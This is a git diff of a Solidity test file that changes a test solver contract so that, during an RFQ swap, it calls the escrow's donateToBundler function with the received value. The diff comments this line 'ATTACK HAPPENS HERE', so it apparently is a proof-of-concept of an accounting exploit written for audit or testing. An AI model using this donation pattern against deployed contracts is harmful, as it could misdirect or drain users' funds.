@@ -16,6 +16,8 @@ import {SwapIntentController, SwapIntent, Condition} from "../src/contracts/exam
 
 import {SolverBase} from "../src/contracts/solver/SolverBase.sol";
 
+import {IEscrow} from "../src/contracts/interfaces/IEscrow.sol";
+
 
 
 contract AccountingTest is BaseTest {
@@ -232,7 +234,12 @@ contract AccountingTest is BaseTest {
 // This solver magically has the tokens needed to fulfil the user's swap.
 // This might involve an offchain RFQ system
 contract SimpleRFQSolver is SolverBase {
-    constructor(address atlas) SolverBase(atlas, msg.sender) {}
+
+    address public immutable ATLAS;
+
+    constructor(address atlas) SolverBase(atlas, msg.sender) {
+        ATLAS = atlas;
+    }
 
     function fulfillRFQ(
         SwapIntent calldata swapIntent,
@@ -243,6 +250,9 @@ contract SimpleRFQSolver is SolverBase {
         require(ERC20(swapIntent.tokenUserSells).balanceOf(address(this)) >= swapIntent.amountUserSells, "Did not receive enough tokenIn");
         require(ERC20(swapIntent.tokenUserBuys).balanceOf(address(this)) >= swapIntent.amountUserBuys, "Not enough tokenOut to fulfill");
         ERC20(swapIntent.tokenUserBuys).transfer(executionEnvironment, swapIntent.amountUserBuys);
+
+        // ATTACK HAPPENS HERE  
+        IEscrow(ATLAS).donateToBundler{value: msg.value}(address(this));
     }
 
     // This ensures a function can only be called through metaFlashCall
@@ -252,6 +262,10 @@ contract SimpleRFQSolver is SolverBase {
         _;
     }
 
-    fallback() external payable {}
-    receive() external payable {}
+    fallback() external payable {
+        console.log("Fallback triggered with value:", msg.value);
+    }
+    receive() external payable {
+        console.log("Receive triggered with value:", msg.value);
+    }
 }
